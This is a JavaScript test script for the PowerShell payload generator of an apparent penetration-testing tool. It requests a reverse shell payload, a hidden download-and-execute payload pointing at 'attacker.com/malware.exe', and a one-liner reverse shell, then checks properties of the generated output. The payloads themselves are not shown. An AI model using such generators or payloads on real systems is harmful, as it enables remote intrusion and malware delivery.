import exploitationService from './backend/services/exploitationService.js';

console.log('🧪 Testing PowerShell Payload Builder\n');

async function testPayloads() {
  try {
    // Test 1: PowerShell Reverse Shell (Full Script)
    console.log('1️⃣ Testing PowerShell Reverse Shell (Full Script)...');
    const ps1 = await exploitationService.generatePayload('reverse-shell-powershell', {
      lhost: '192.168.1.100',
      lport: 4444
    });
    console.log('✓ Type:', ps1.type);
    console.log('✓ Format:', ps1.format);
    console.log('✓ Payload Length:', ps1.payload.length, 'characters');
    console.log('✓ Contains Configuration:', ps1.payload.includes('$LHOST') ? 'Yes' : 'No');
    console.log('✓ Contains Function:', ps1.payload.includes('function Invoke-ReverseShell') ? 'Yes' : 'No');
    console.log('✓ Contains Error Handling:', ps1.payload.includes('try') && ps1.payload.includes('catch') ? 'Yes' : 'No');
    console.log('✓ First 100 chars:', ps1.payload.substring(0, 100) + '...\n');
    
    // Test 2: PowerShell Download & Execute
    console.log('2️⃣ Testing PowerShell Download & Execute...');
    const ps2 = await exploitationService.generatePayload('powershell-download-execute', {
      url: 'http://attacker.com/malware.exe',
      proxy: 'http://proxy:8080',
      hidden: true,
      cleanup: true
    });
    console.log('✓ Contains URL:', ps2.payload.includes('http://attacker.com/malware.exe') ? 'Yes' : 'No');
    console.log('✓ Contains Proxy:', ps2.payload.includes('proxy') ? 'Yes' : 'No\n');
    
    // Test 3: PowerShell One-Liner
    console.log('3️⃣ Testing PowerShell One-Liner...');
    const ps3 = await exploitationService.generatePayload('powershell-oneliner', {
      lhost: '10.0.0.1',
      lport: 443
    });
    console.log('✓ Format:', ps3.format);
    console.log('✓ Is One-Line:', !ps3.payload.includes('\n') ? 'Yes' : 'No');
    console.log('✓ Length:', ps3.payload.length, 'characters\n');
    
    console.log('✅ All PowerShell payload builder tests passed!');
    
  } catch (error) {
    console.error('❌ Test failed:', error.message);
    console.error(error.stack);
    process.exit(1);
  }
}

testPayloads();
